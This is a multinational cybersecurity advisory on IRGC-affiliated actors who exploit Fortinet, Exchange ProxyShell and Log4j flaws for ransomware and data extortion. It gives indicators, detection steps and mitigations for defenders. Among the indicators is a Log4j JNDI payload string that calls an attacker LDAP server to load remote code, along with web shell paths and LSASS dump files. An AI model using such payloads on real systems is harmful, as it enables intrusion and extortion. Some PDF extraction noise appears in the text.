Note: The IRGC is an Iranian Government agency tasked with defending\nthe Iranian Regime from perceived internal and external threats. Hereafter, this advisory refers to all the coauthors of this advisory as\n\"the authoring agencies.\"\n\nThis advisory updates joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet\nVulnerabilities in Furtherance of Malicious Activities, which provides information on these Iranian government-sponsored APT actors\nexploiting known Fortinet and Microsoft Exchange vulnerabilities to gain initial access to a broad range of targeted entities in\nfurtherance of malicious activities, including ransom operations. The authoring agencies now judge these actors are an APT group\naffiliated with the IRGC.\n\nSince the initial reporting of this activity in the FBI Liaison Alert System (FLASH) report APT Actors Exploiting Fortinet Vulnerabilities\nto Gain Access for Malicious Activity from May 2021, the authoring agencies have continued to observe these IRGC-affiliated actors\nexploiting known vulnerabilities for initial access. In addition to exploiting Fortinet and Microsoft Exchange vulnerabilities, the\nauthoring agencies have observed these APT actors exploiting VMware Horizon Log4j vulnerabilities for initial access. The IRGCaffiliated actors have used this access for follow-on activity, including disk encryption and data extortion, to support ransom\noperations.\n\nThe IRGC-affiliated actors are actively targeting a broad range of entities, including entities across multiple U.S. critical infrastructure\nsectors as well as Australian, Canadian, and United Kingdom organizations. These actors often operate under the auspices of Najee\nTechnology Hooshmand Fater LLC, based in Karaj, Iran, and Afkar System Yazd Company, based in Yazd, Iran. The authoring\nagencies assess the actors are exploiting known vulnerabilities on unprotected networks rather than targeting specific targeted\nentities or sectors.\n\nThis advisory provides observed tactics, techniques, and indicators of compromise (IOCs) that the authoring agencies assess are\nlikely associated with this IRGC-affiliated APT. The authoring agencies urge organizations, especially critical infrastructure\norganizations, to apply the recommendations listed in the Mitigations section of this advisory to mitigate risk of compromise from\nthese IRGC-affiliated cyber actors.\n\n[For a downloadable copy of IOCs, see AA22-257A.stix.](https://www.us-cert.gov/sites/default/files/AA22-257A.stix.xml)\n\nFor more information on Iranian state-sponsored malicious cyber activity, see CISA’s [Iran Cyber Threat Overview and Advisories](https://www.us-cert.cisa.gov/iran)\nwebpage and FBI’s [Iran Threat webpage.](https://www.fbi.gov/investigate/counterintelligence/the-iran-threat)\n\n[Download the PDF version of this report: pdf, 836 kb](https://www.cisa.gov/sites/default/files/publications/aa22-257a-iranian-islamic-revolutionary-guard-corps-affiliated-cyber-actors.pdf)\n\n## Technical Details\n\n**Threat Actor Activity**\n\nAs reported in joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities\nin Furtherance of Malicious Activities, the authoring agencies have observed Iranian government-sponsored APT actors scanning for\nand/or exploiting the following known Fortinet FortiOS and Microsoft Exchange server vulnerabilities since early 2021 to gain initial\n[access to a broad range of targeted entities: CVE-2018-13379,](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13379) [CVE-2020-12812,](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12812) [CVE-2019-5591, and](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5591) [CVE-2021-34473 (a](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34473)\nProxyShell vulnerability) The authoring agencies have also observed these APT actors leveraging CVE 2021 34473 against U S\n\n\n-----\n\n[networks in combination with ProxyShell vulnerabilities CVE 2021 34523 and](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34523) [CVE 2021 31207. The NCSC judges that Yazd, Iran](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-31207)\nbased company Afkar System Yazd Company is actively targeting UK organizations. Additionally, ACSC judges that these APT actors\nhave used CVE-2021-34473 in Australia to gain access to systems. The APT actors can leverage this access for further malicious\nactivities, including deployment of tools to support ransom and extortion operations, and data exfiltration.\n\nSince the activity was reported in 2021, these IRGC-affiliated actors have continued to exploit known vulnerabilities for initial access.\nIn addition to exploiting Fortinet and Microsoft Exchange vulnerabilities, the authoring agencies have observed these APT actors\n[exploiting VMware Horizon Log4j vulnerabilities CVE-2021-44228 (“Log4Shell”), CVE-2021-45046, and](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228) [CVE-2021-45105 for initial](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45105)\naccess.\n\nThe IRGC-affiliated actors have used their access for ransom operations, including disk encryption and extortion efforts. After gaining\naccess to a network, the IRGC-affiliated actors likely determine a course of action based on their perceived value of the data.\nDepending on the perceived value, the actors may encrypt data for ransom and/or exfiltrate data. The actors may sell the data or use\nthe exfiltrated data in extortion operations or “double extortion” ransom operations where a threat actor uses a combination of\nencryption and data theft to pressure targeted entities to pay ransom demands.\n\nIRGC-affiliated actor activity observed by the authoring agencies includes:\n\nIn December 2021, the actors exploited ProxyShell vulnerabilities (likely CVE-2021-34473, CVE-2021-34523, and CVE-202131207) on a Microsoft Exchange server to gain access to the network of a U.S. police department. The actors used their access\nto move laterally within the network, encrypt network devices with BitLocker, and hold the decryption keys for ransom.\nIn December 2021, the actors exploited ProxyShell vulnerabilities (likely CVE-2021-34473, CVE-2021-34523, and CVE-202131207), on a Microsoft Exchange server to gain access to the network of a U.S. regional transportation company. The actors\nused their access to move laterally within the network, encrypt network devices with BitLocker, and hold the decryption keys for\nransom. This activity disrupted the transportation company’s operations for an extended period.\nIn February 2022, the actors exploited a Log4j vulnerability (likely CVE-2021-44228, CVE-2021-45046, and/or CVE-202145105) in a VMware Horizon application to gain access to the network of a U.S. municipal government, move laterally within the\nnetwork, establish persistent access, initiate crypto-mining operations, and conduct additional malicious activity.\nIn February 2022, the actors may have exploited a Log4j vulnerability (likely CVE-2021-44228, CVE-2021-45046, and/or CVE2021) to gain access to the network of a U.S. aerospace company. The actors leveraged a server that the authoring agencies\nassess is associated with the IRGC-affiliated actors to exfiltrate data from the company's network.\n\n**MITRE ATT&CK® Tactics and Techniques**\n\n**Note: This advisory uses the MITRE** [ATT&CK for Enterprise framework, version 11. See Appendix B for a table of the MITRE](https://attack.mitre.org/versions/v11/techniques/enterprise/)\nATT&CK tactics and techniques observed.\n\nThe authoring agencies assess the following tactics and techniques are associated with this activity.\n\n**_[Resource Development [TA0042]](https://attack.mitre.org/versions/v11/tactics/TA0042)_**\n\n[The IRGC-affiliated actors have used the following malicious and legitimate tools [T1588.001,](https://attack.mitre.org/versions/v11/techniques/T1588/001) [T1588.002] for a variety of tactics](https://attack.mitre.org/versions/v11/techniques/T1588/002)\nacross the enterprise spectrum:\n\nFast Reverse Proxy (FRP) for command and control (C2)\nPlink for C2\nRemote Desktop Protocol (RDP) for lateral movement\nBitLocker for data encryption\nSoftPerfect Network Scanner for system network configuration discovery\n\n**Note: For additional tools used by these IRGC-affiliated cyber actors, see joint CSA Iranian Government-Sponsored APT Cyber**\nActors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities.\n\n**_[Initial Access [TA0001]](https://attack.mitre.org/versions/v11/tactics/TA0001/)_**\n\nAs stated in the Technical Details section previously reported in joint CSA Iranian Government-Sponsored APT Cyber Actors\nExploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities, the IRGC-affiliated actors gained\n[initial access by exploiting known vulnerabilities [T1190].](https://attack.mitre.org/versions/v11/techniques/T1190/)\n\nThe following IOCs, observed as of March 2022, are indicative of ProxyShell vulnerability exploitation on targeted entity networks:\n\n\n-----\n\nWeb shells with naming conventions aspx_[11 randomly generated alphabetic characters].aspx, login.aspx, or default.aspx in\nany of the following directories:\n\nC:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\ecp\\auth\\\nC:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\\nC:\\inetpub\\wwwroot\\aspnet_client\\\n\nThe following IOCs, observed as of December 2021, are indicative of Log4j vulnerability exploitation on targeted entity networks:\n\n${jndi:ldap//148.251.71.182:1389/RCE} (user agent string)\nRCE.class\n\n**_[Execution [TA0002]](https://attack.mitre.org/versions/v11/tactics/TA0002)_**\n\n[The IRGC-affiliated actors may have made modifications to the Task Scheduler [T1053.005]. These modifications may display as](https://attack.mitre.org/versions/v11/techniques/T1053/005)\nunrecognized scheduled tasks or actions. Specifically, the below established tasks may be associated with this activity:\n\nWininet\nWininet’\nWinLogon\nCacheTask\n\n**Note: The potential exists that tasks associated with CacheTask or Wininet may be legitimate. For additional tasks used by these**\nIRGC-affiliated cyber actors, see joint CSA Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and\nFortinet Vulnerabilities in Furtherance of Malicious Activities.\n\n**_[Persistence [TA0003]](https://attack.mitre.org/versions/v11/tactics/TA0003)_**\n\nThe IRGC-affiliated actors established new user accounts on domain controllers, servers, workstations, and active directories\n\n[[T1136.001,](https://attack.mitre.org/versions/v11/techniques/T1136/001) [T1136.002]. The actors enabled a built-in Windows account (DefaultAccount) and escalated privileges to gain](https://attack.mitre.org/versions/v11/techniques/T1136/002)\nadministrator-level access to a network. Some of these accounts appear to have been created to look similar to other existing\naccounts on the network, so specific account names may vary per organization. In addition to unrecognized user accounts or\naccounts established to masquerade as existing accounts, the following account usernames may be associated with this activity:\n\nDomain Admin\nit_admin\nDefaultAccount\nDefault01\n\n**Note: For additional account usernames associated with this activity, see joint CSA** Iranian Government-Sponsored APT Cyber Actors\nExploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities.\n\n**_[Exfiltration [TA0010]](https://attack.mitre.org/versions/v11/tactics/TA0010/)_**\n\nThe authoring agencies have observed the IRGC-affiliated actors dumping and subsequently exfiltrating the Local Security Authority\nSubsystem Service (LSASS) process memory on targeted entity networks in furtherance of credential harvesting. The following IOCs\nare associated with data exfiltration from targeted entity networks:\n\nC:\\Windows\\Temp\\sassl[.]pmd\nC:\\Windows\\Temp\\ssasl[.]zip\nC:\\Users\\DefaultAccount\\AppData\\Local\\Temp\\lsass[.]dmp\nC:\\Users\\DefaultAccount\\AppData\\Local\\Temp\\lsass[.]zip\n\n**_[Impact [TA0040]](https://attack.mitre.org/versions/v11/tactics/TA0040)_**\n\n[The IRGC-affiliated actors forced BitLocker activation on host networks to encrypt data [T1486] and held the decryption keys for](https://attack.mitre.org/versions/v10/techniques/T1486)\nransom. The corresponding ransom notes were sent to the targeted entity, left on the targeted entity network as a .txt file or printed on\nthe targeted entity’s networked printer(s). The notes included the following contact information:\n\n@BuySafety (Telegram)\n@WeRBits (Telegram)\n+93794415076 (WhatsApp)\nwerbits@onionmail[.]org\nbuysafety@onionmail[.]org\nyacashcash@rambler[.]ru\n\n\n-----\n\n**Note: For additional contact information included in ransom notes, see joint CSA Iranian Government Sponsored APT Cyber Actors**\nExploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities.\n\n## DETECTION\n\nThe authoring agencies recommend that organizations using Microsoft Exchange servers, Fortinet devices, and/or VMware Horizon\napplications investigate potential suspicious activity in their networks.\n\nSearch for IOCs. Collect known-bad IOCs and search for them in network and host artifacts.\n\n**Note: Refer to Appendix A for IOCs.**\nReview Log4j vulnerabilities, including CVE-2021-44228, CVE-2021-45046, and CVE-2021- 45105.\nReview Microsoft Exchange ProxyShell vulnerabilities, including CVE-2021-34473, CVE-2021- 34523, and CVE-2021-31207.\nAs a precaution, review additional Microsoft Exchange vulnerabilities, including CVE-2021- 31196, CVE-2021-31206, CVE2021-33768, CVE-2021-33766, and CVE-2021-34470 because the authoring agencies have seen the actors broadly target\nMicrosoft Exchange servers.\nInvestigate exposed Microsoft Exchange servers, both patched and unpatched, for compromise.\nReview Fortinet FortiOS vulnerabilities, including CVE-2018-13379, CVE-2020-12812, and CVE-2019-5591.\nReview VMware vulnerabilities, including any relevant vulnerabilities listed on the VMware security advisory page.\nInvestigate changes to RDP, firewall, and Windows Remote Management (WinRM) configurations that may allow malicious\ncyber actors to maintain persistent access.\nReview domain controllers, servers, workstations, and active directories for new or unrecognized user accounts.\nReview Task Scheduler for unrecognized scheduled tasks. Additionally, manually review operating-system and scheduled tasks\n—including each step these tasks perform—for unrecognized “actions.”\nReview antivirus logs for indications they were unexpectedly turned off.\nLook for WinRAR and FileZilla in unexpected locations.\nReview servers and workstations for malicious executable files masquerading as legitimate Windows processes. Malicious files\nmay not be found in the expected directory and may have cmd.exe or powershell.exe as their parent process.\n\n**Note: For additional approaches on uncovering malicious cyber activity, see joint advisory Technical Approaches to Uncovering and**\nRemediating Malicious Activity, authored by CISA and the cybersecurity authorities of Australia, Canada, New Zealand, and the\nUnited Kingdom.\n\n## Mitigations\n\nThe authoring agencies urge network defenders to prepare for and mitigate potential cyber threats immediately by implementing the\nmitigations below.\n\n**Implement and Enforce Backup and Restoration Policies and Procedures**\n\n**Maintain offline (i.e., physically disconnected) backups of data, and regularly test backup and restoration. These**\npractices safeguard an organization’s continuity of operations or at least minimize potential downtime from a ransomware or\nother destructive data incident and protect against data losses.\n\n**Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s**\ndata infrastructure.\n**Activate BitLocker on all networks and securely back up BitLocker keys with Microsoft and with an independent offline**\nbackup.\nCreate, maintain, and exercise a basic cyber incident response plan that includes response procedures for a ransom incident.\n**Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically**\nseparate, segmented, secure location (e.g., hard drive, storage device, the cloud).\n\n**Patch and Update Systems**\n\nU.S. federal, state, local, tribal, and territorial (SLTT) government and critical infrastructure organizations: Implement free CISA\nCyber Hygiene Services Vulnerability Scanning to enable continuous scans of public, static IPs for accessible services and\nvulnerabilities.\nInstall updates/patch operating systems, software, and firmware as soon as updates/patches are released. Regularly check\nsoftware updates and end-of-life notifications. Consider leveraging a centralized patch management system to automate and\nexpedite the process.\nImmediately patch software affected by vulnerabilities identified in this advisory: CVE-2021- 34473, CVE-2018-13379, CVE2020-12812, CVE-2019-5591, CVE-2021-34523, CVE-2021- 31207, CVE-2021-44228, CVE-2021-45046, CVE-2021-45105,\nCVE-2021-31196, CVE-2021- 31206, CVE-2021-33768, CVE-2021-33766, and CVE-2021-34470.\n\n\n-----\n\n**a uate a d Update** **oc** **sts a d** **o** **sts**\n\nRegularly evaluate and update blocklists and allowlists.\nIf FortiOS is not used by your organization, add the key artifact files used by FortiOS to your organization’s execution blocklist.\nPrevent any attempts to install or run this program and its associated files.\n\n**Implement Network Segmentation**\n\nImplement network segmentation to restrict a malicious threat actor’s lateral movement.\n\n**Secure User Accounts**\n\nAudit user accounts with administrative privileges and configure access controls under the principles of least privilege and\nseparation of duties.\nRequire administrator credentials to install software.\n\n**Implement Multifactor Authentication**\n\nUse multifactor authentication where possible, particularly for webmail, virtual private networks (VPNs), accounts that access\ncritical systems, and privileged accounts that manage backups.\n\n**Use Strong Passwords**\n\nRequire all accounts with password logins to have strong, unique passwords. See CISA Tip Choosing and Protecting\n[Passwords and National Institute of Standards and Technology (NIST) Special Publication 800-63B: Digital Identity Guidelines](https://csrc.nist.gov/publications/detail/sp/800-63b/final)\nfor more information.\n\n**Secure and Monitor RDP and other Potentially Risky Services**\n\nIf you use RDP, restrict it to limit access to resources over internal networks. After assessing risks, if your organization deems\nRDP operationally necessary, restrict the originating sources, and require MFA to mitigate credential theft and reuse. If RDP\nmust be available externally, use a VPN, virtual desktop infrastructure, or other means to authenticate and secure the\nconnection before allowing RDP to connect to internal devices.\nDisable unused remote access/RDP ports.\nMonitor remote access/RDP logs, enforce account lockouts after a specified number of attempts (to block brute force\ncampaigns), and log RDP login attempts.\n\n**Use Antivirus Programs**\n\nInstall and regularly update antivirus and anti-malware software on all hosts.\n\n**Secure Remote Access**\n\nOnly use secure networks.\nConsider installing and using a VPN for remote access.\n\n## VALIDATE SECURITY CONTROLS\n\nIn addition to applying mitigations, the authoring agencies recommend exercising, testing, and validating your organization's security\nprogram against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The authoring\nagencies recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques\ndescribed in this advisory.\n\nTo get started:\n\n1. Select an ATT&CK technique described in this advisory (see Appendix B).\n2. Align your security technologies against the technique.\n3. Test your technologies against the technique.\n4. Analyze your detection and prevention technologies performance.\n5. Repeat the process for all security technologies to obtain a set of comprehensive performance data.\n6. Tune your security program, including people, processes, and technologies, based on the data generated by this process.\n\nThe authoring agencies recommend continually testing your security program, at scale, in a production environment to ensure optimal\nperformance against the MITRE ATT&CK techniques identified in this advisory.\n\n## RESPONDING TO RANSOMWARE OR EXTORTION INCIDENTS\n\n\n-----\n\nIf a ransomware or extortion incident occurs at your organization:\n\nFollow the Ransomware Response Checklist on page 11 of the CISA-Multi-State Information Sharing and Analysis Center (MSISAC) Joint Ransomware Guide.\nScan backups. If possible, scan backup data with an antivirus program to check that it is free of malware. This should be\nperformed using an isolated, trusted system to avoid exposing backups to potential compromise.\nFollow the notification requirements as outlined in your cyber incident response plan.\n\n**U.S. organizations: Report incidents to FBI at a** [local FBI Field Office or the FBI's 24/7 CyWatch at (855)292-3937 or](https://www.fbi.gov/contact-us/field-offices)\n[cywatch@fbi.gov, CISA’s 24/7 Operations Center at report@cisa.gov or (888) 282-0870, or the U.S. Secret Service](mailto:report@cisa.gov)\n(USSS) at a [USSS Field Office.](http://www.secretservice.gov/contact/field-offices/)\n**Australian organizations: Visit** [cyber.gov.au or call 1300 292 371 (1300 CYBER 1) to report cybersecurity incidents and](https://www.cyber.gov.au/)\naccess alerts and advisories.\n**[Canadian organizations: Report incidents by emailing CCCS at contact@cyber.gc.ca.](mailto:contact@cyber.gc.ca)**\n**[United Kingdom organizations: Report a significant cyber security incident: ncsc.gov.uk/report-an-incident (monitored 24](https://report.ncsc.gov.uk/)**\nhours)\nApply incident response best practices found in the joint Cybersecurity Advisory, Technical Approaches to Uncovering and\nRemediating Malicious Activity, developed by CISA and the cybersecurity authorities of Australia, Canada, New Zealand, and\nthe United Kingdom.\n\n**Note: The authoring agencies strongly discourage paying ransoms as doing so does not guarantee files and records will be recovered**\nand may pose sanctions risks.\n\n## RESOURCES\n\nThe U.S. Department of State’s Rewards for Justice (RFJ) program offers a reward of up to $10 million for reports of foreign\n[government malicious activity against U.S. critical infrastructure.
